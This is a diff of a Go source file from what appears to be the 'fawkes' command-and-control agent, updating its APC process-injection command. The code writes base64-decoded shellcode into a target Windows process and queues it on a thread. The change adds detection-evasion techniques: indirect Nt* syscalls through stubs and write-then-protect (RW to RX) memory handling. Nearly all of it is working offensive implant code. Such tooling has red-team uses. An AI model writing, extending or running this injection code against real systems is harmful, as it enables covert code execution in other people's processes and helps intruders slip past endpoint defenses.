@@ -3,22 +3,13 @@
 
 // Package commands provides the apc-injection command for QueueUserAPC-based process injection.
 //
-// This command performs APC injection using the following Windows APIs:
-// - VirtualAllocEx: Allocates memory in the target process
-// - WriteProcessMemory: Writes shellcode to allocated memory
-// - OpenThread: Opens a handle to the target alertable thread
-// - QueueUserAPC: Queues the shellcode as an APC to the thread
-// - ResumeThread: Resumes the thread if it's suspended (to trigger APC execution)
+// When indirect syscalls are active, uses Nt* APIs via indirect stubs:
+// NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory,
+// NtOpenThread, NtQueueApcThread, NtResumeThread
 //
 // Requirements:
 // - Target thread must be in an alertable wait state (Suspended or DelayExecution)
 // - Use the 'ts' command to identify alertable threads before injection
-//
-// Security considerations:
-// - Requires appropriate privileges to inject into the target process
-// - APC injection is a well-known technique but can be less signatured than CreateRemoteThread
-// - Suspended threads require ResumeThread which may be monitored
-// - DelayExecution threads will execute APC when their wait completes
 package commands
 
 import (
@@ -26,6 +17,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"runtime"
+	"strings"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -42,10 +34,11 @@ const (
 
 // Windows API procedures for APC injection
 var (
-	procOpenThread    = kernel32.NewProc("OpenThread")
-	procQueueUserAPC  = kernel32.NewProc("QueueUserAPC")
-	procResumeThread  = kernel32.NewProc("ResumeThread")
-	procGetThreadId   = kernel32.NewProc("GetThreadId")
+	procOpenThread      = kernel32.NewProc("OpenThread")
+	procQueueUserAPC    = kernel32.NewProc("QueueUserAPC")
+	procResumeThread    = kernel32.NewProc("ResumeThread")
+	procGetThreadId     = kernel32.NewProc("GetThreadId")
+	procVirtualProtectX = kernel32.NewProc("VirtualProtectEx")
 )
 
 // ApcInjectionCommand implements the apc-injection command
@@ -70,7 +63,6 @@ type ApcInjectionParams struct {
 
 // Execute executes the apc-injection command
 func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
-	// Ensure we're on Windows
 	if runtime.GOOS != "windows" {
 		return structs.CommandResult{
 			Output:    "Error: This command is only supported on Windows",
@@ -79,7 +71,6 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Parse parameters
 	var params ApcInjectionParams
 	err := json.Unmarshal([]byte(task.Params), &params)
 	if err != nil {
@@ -90,7 +81,6 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Validate parameters
 	if params.ShellcodeB64 == "" {
 		return structs.CommandResult{
 			Output:    "Error: No shellcode data provided",
@@ -115,7 +105,6 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Decode the base64-encoded shellcode
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
 		return structs.CommandResult{
@@ -133,7 +122,6 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Perform the injection
 	output, err := performApcInjection(shellcode, params.PID, params.TID)
 	if err != nil {
 		return structs.CommandResult{
@@ -150,125 +138,190 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 }
 
-// performApcInjection executes the QueueUserAPC injection technique
+// performApcInjection dispatches to indirect or standard APC injection
 func performApcInjection(shellcode []byte, pid int, tid int) (string, error) {
-	var output string
+	var sb strings.Builder
 
-	output += fmt.Sprintf("[*] APC Injection starting\n")
-	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
-	output += fmt.Sprintf("[*] Target PID: %d, TID: %d\n", pid, tid)
+	sb.WriteString("[*] APC Injection starting\n")
+	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
+	sb.WriteString(fmt.Sprintf("[*] Target PID: %d, TID: %d\n", pid, tid))
 
 	// Check thread state and warn if not alertable
 	threadState := getThreadWaitReason(uint32(tid))
-	output += fmt.Sprintf("[*] Target thread state: %s\n", threadState)
+	sb.WriteString(fmt.Sprintf("[*] Target thread state: %s\n", threadState))
 
 	if threadState != "Suspended" && threadState != "DelayExecution" &&
 		threadState != "WrSuspended" && threadState != "WrDelayExecution" {
-		output += fmt.Sprintf("[!] WARNING: Thread is not in an alertable state (%s)\n", threadState)
-		output += "[!] APC may not execute until thread enters an alertable wait\n"
+		sb.WriteString(fmt.Sprintf("[!] WARNING: Thread is not in an alertable state (%s)\n", threadState))
+		sb.WriteString("[!] APC may not execute until thread enters an alertable wait\n")
 	}
 
-	// Step 1: Open handle to target process
+	if IndirectSyscallsAvailable() {
+		sb.WriteString("[*] Using indirect syscalls (Nt* via stubs)\n")
+		return apcIndirect(&sb, shellcode, pid, tid, threadState)
+	}
+	return apcStandard(&sb, shellcode, pid, tid, threadState)
+}
+
+// apcStandard uses Win32 APIs with W^X memory pattern
+func apcStandard(sb *strings.Builder, shellcode []byte, pid, tid int, threadState string) (string, error) {
+	// Step 1: Open process
 	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
 		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
 
 	hProcess, _, err := procOpenProcess.Call(
-		uintptr(desiredAccess),
-		uintptr(0),
-		uintptr(pid),
-	)
-
+		uintptr(desiredAccess), 0, uintptr(pid))
 	if hProcess == 0 {
-		return output, fmt.Errorf("OpenProcess failed: %v", err)
+		return sb.String(), fmt.Errorf("OpenProcess failed: %v", err)
 	}
 	defer procCloseHandle.Call(hProcess)
+	sb.WriteString(fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess))
 
-	output += fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess)
-
-	// Step 2: Allocate memory in remote process
+	// Step 2: Allocate RW memory (W^X: write first, protect later)
 	remoteAddr, _, err := procVirtualAllocEx.Call(
-		hProcess,
-		uintptr(0),
-		uintptr(len(shellcode)),
-		uintptr(MEM_COMMIT|MEM_RESERVE),
-		uintptr(PAGE_EXECUTE_READ),
-	)
-
+		hProcess, 0, uintptr(len(shellcode)),
+		uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_READWRITE))
 	if remoteAddr == 0 {
-		return output, fmt.Errorf("VirtualAllocEx failed: %v", err)
+		return sb.String(), fmt.Errorf("VirtualAllocEx failed: %v", err)
 	}
+	sb.WriteString(fmt.Sprintf("[+] Allocated RW memory at: 0x%X\n", remoteAddr))
 
-	output += fmt.Sprintf("[+] Allocated memory at: 0x%X\n", remoteAddr)
-
-	// Step 3: Write shellcode to remote process
+	// Step 3: Write shellcode
 	var bytesWritten uintptr
 	ret, _, err := procWriteProcessMemory.Call(
-		hProcess,
-		remoteAddr,
-		uintptr(unsafe.Pointer(&shellcode[0])),
-		uintptr(len(shellcode)),
-		uintptr(unsafe.Pointer(&bytesWritten)),
-	)
-
+		hProcess, remoteAddr, uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)), uintptr(unsafe.Pointer(&bytesWritten)))
 	if ret == 0 {
-		return output, fmt.Errorf("WriteProcessMemory failed: %v", err)
+		return sb.String(), fmt.Errorf("WriteProcessMemory failed: %v", err)
 	}
+	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten))
 
-	output += fmt.Sprintf("[+] Wrote %d bytes to remote memory\n", bytesWritten)
+	// Step 4: Change to RX (W^X enforcement)
+	var oldProtect uint32
+	ret, _, err = procVirtualProtectX.Call(
+		hProcess, remoteAddr, uintptr(len(shellcode)),
+		uintptr(PAGE_EXECUTE_READ), uintptr(unsafe.Pointer(&oldProtect)))
+	if ret == 0 {
+		return sb.String(), fmt.Errorf("VirtualProtectEx failed: %v", err)
+	}
+	sb.WriteString("[+] Changed memory protection to RX\n")
 
-	// Step 4: Open handle to target thread
+	// Step 5: Open thread
 	hThread, _, err := procOpenThread.Call(
-		uintptr(THREAD_ALL_ACCESS),
-		uintptr(0),
-		uintptr(tid),
-	)
-
+		uintptr(THREAD_ALL_ACCESS), 0, uintptr(tid))
 	if hThread == 0 {
-		return output, fmt.Errorf("OpenThread failed: %v", err)
+		return sb.String(), fmt.Errorf("OpenThread failed: %v", err)
 	}
 	defer procCloseHandle.Call(hThread)
+	sb.WriteString(fmt.Sprintf("[+] Opened thread handle: 0x%X\n", hThread))
 
-	output += fmt.Sprintf("[+] Opened thread handle: 0x%X\n", hThread)
-
-	// Step 5: Queue the APC
-	ret, _, err = procQueueUserAPC.Call(
-		remoteAddr,  // lpStartAddress - pointer to shellcode
-		hThread,     // hThread - handle to alertable thread
-		uintptr(0),  // dwData - no additional data
-	)
-
+	// Step 6: Queue APC
+	ret, _, err = procQueueUserAPC.Call(remoteAddr, hThread, 0)
 	if ret == 0 {
-		return output, fmt.Errorf("QueueUserAPC failed: %v", err)
+		return sb.String(), fmt.Errorf("QueueUserAPC failed: %v", err)
+	}
+	sb.WriteString("[+] APC queued successfully\n")
+
+	// Step 7: Resume if suspended
+	apcResumeThread(sb, hThread, threadState, false)
+
+	sb.WriteString("[+] APC injection completed successfully\n")
+	return sb.String(), nil
+}
+
+// apcIndirect uses Nt* APIs via indirect syscall stubs
+func apcIndirect(sb *strings.Builder, shellcode []byte, pid, tid int, threadState string) (string, error) {
+	// Step 1: NtOpenProcess
+	var hProcess uintptr
+	status := IndirectNtOpenProcess(&hProcess, uint32(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|
+		PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ), uintptr(pid))
+	if status != 0 {
+		return sb.String(), fmt.Errorf("NtOpenProcess failed: NTSTATUS 0x%X", status)
+	}
+	defer IndirectNtClose(hProcess)
+	sb.WriteString(fmt.Sprintf("[+] NtOpenProcess: 0x%X\n", hProcess))
+
+	// Step 2: NtAllocateVirtualMemory (RW)
+	var remoteAddr uintptr
+	regionSize := uintptr(len(shellcode))
+	status = IndirectNtAllocateVirtualMemory(hProcess, &remoteAddr, &regionSize,
+		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	if status != 0 {
+		return sb.String(), fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%X", status)
+	}
+	sb.WriteString(fmt.Sprintf("[+] NtAllocateVirtualMemory: 0x%X (RW)\n", remoteAddr))
+
+	// Step 3: NtWriteVirtualMemory
+	var bytesWritten uintptr
+	status = IndirectNtWriteVirtualMemory(hProcess, remoteAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
+	if status != 0 {
+		return sb.String(), fmt.Errorf("NtWriteVirtualMemory failed: NTSTATUS 0x%X", status)
+	}
+	sb.WriteString(fmt.Sprintf("[+] NtWriteVirtualMemory: %d bytes\n", bytesWritten))
+
+	// Step 4: NtProtectVirtualMemory (RW → RX)
+	protectAddr := remoteAddr
+	protectSize := uintptr(len(shellcode))
+	var oldProtect uint32
+	status = IndirectNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize,
+		PAGE_EXECUTE_READ, &oldProtect)
+	if status != 0 {
+		return sb.String(), fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%X", status)
+	}
+	sb.WriteString("[+] NtProtectVirtualMemory: RW → RX\n")
+
+	// Step 5: NtOpenThread
+	var hThread uintptr
+	status = IndirectNtOpenThread(&hThread, THREAD_ALL_ACCESS, uintptr(tid))
+	if status != 0 {
+		return sb.String(), fmt.Errorf("NtOpenThread failed: NTSTATUS 0x%X", status)
+	}
+	defer IndirectNtClose(hThread)
+	sb.WriteString(fmt.Sprintf("[+] NtOpenThread: 0x%X\n", hThread))
+
+	// Step 6: NtQueueApcThread
+	status = IndirectNtQueueApcThread(hThread, remoteAddr, 0, 0, 0)
+	if status != 0 {
+		return sb.String(), fmt.Errorf("NtQueueApcThread failed: NTSTATUS 0x%X", status)
+	}
+	sb.WriteString("[+] NtQueueApcThread: APC queued\n")
+
+	// Step 7: Resume if suspended
+	apcResumeThread(sb, hThread, threadState, true)
+
+	sb.WriteString("[+] APC injection completed successfully (indirect syscalls)\n")
+	return sb.String(), nil
+}
+
+// apcResumeThread resumes a suspended thread using either indirect or standard API
+func apcResumeThread(sb *strings.Builder, hThread uintptr, threadState string, indirect bool) {
+	if threadState != "Suspended" && threadState != "WrSuspended" {
+		sb.WriteString("[*] Thread not suspended, APC will execute when thread enters alertable wait\n")
+		return
 	}
 
-	output += "[+] APC queued successfully\n"
-
-	// Step 6: Resume thread if suspended
-	if threadState == "Suspended" || threadState == "WrSuspended" {
-		output += "[*] Thread is suspended, calling ResumeThread...\n"
-
-		prevCount, _, err := procResumeThread.Call(hThread)
-
-		// ResumeThread returns -1 on failure, otherwise the previous suspend count
-		if int32(prevCount) == -1 {
-			return output, fmt.Errorf("ResumeThread failed: %v", err)
+	sb.WriteString("[*] Thread is suspended, resuming...\n")
+	if indirect {
+		var prevCount uint32
+		status := IndirectNtResumeThread(hThread, &prevCount)
+		if status != 0 {
+			sb.WriteString(fmt.Sprintf("[!] NtResumeThread failed: NTSTATUS 0x%X\n", status))
+			return
 		}
-
-		output += fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount)
+		sb.WriteString(fmt.Sprintf("[+] NtResumeThread: previous suspend count: %d\n", prevCount))
 	} else {
-		output += "[*] Thread not suspended, APC will execute when thread enters alertable wait\n"
+		prevCount, _, _ := procResumeThread.Call(hThread)
+		if int32(prevCount) == -1 {
+			sb.WriteString("[!] ResumeThread failed\n")
+			return
+		}
+		sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))
 	}
-
-	output += "[+] APC injection completed successfully\n"
-
-	return output, nil
 }
 
 // getThreadWaitReason returns the wait reason for a thread
 func getThreadWaitReason(tid uint32) string {
-	// Use NtQuerySystemInformation to get thread state
-	// This is similar to what we do in ts.go
-
 	var bufferSize uint32 = 1024 * 1024
 	var buffer []byte
 	var returnLength uint32
@@ -293,7 +346,6 @@ func getThreadWaitReason(tid uint32) string {
 		break
 	}
 
-	// Parse to find the thread
 	offset := uint32(0)
 	for {
 		if offset >= uint32(len(buffer)) {
@@ -325,15 +377,3 @@ func getThreadWaitReason(tid uint32) string {
 
 	return "Unknown"
 }
-
-// Note: We reuse types and constants from ts.go:
-// - SYSTEM_PROCESS_INFORMATION
-// - SYSTEM_THREAD_INFORMATION
-// - KWAIT_REASON and getWaitReasonString()
-// - SystemProcessInformation constant
-// - procNtQuerySystemInformation
-
-// We also reuse from vanillainjection.go:
-// - kernel32, procVirtualAllocEx, procWriteProcessMemory, procOpenProcess, procCloseHandle
-// - Process access constants (PROCESS_*)
-// - Memory constants (MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ)
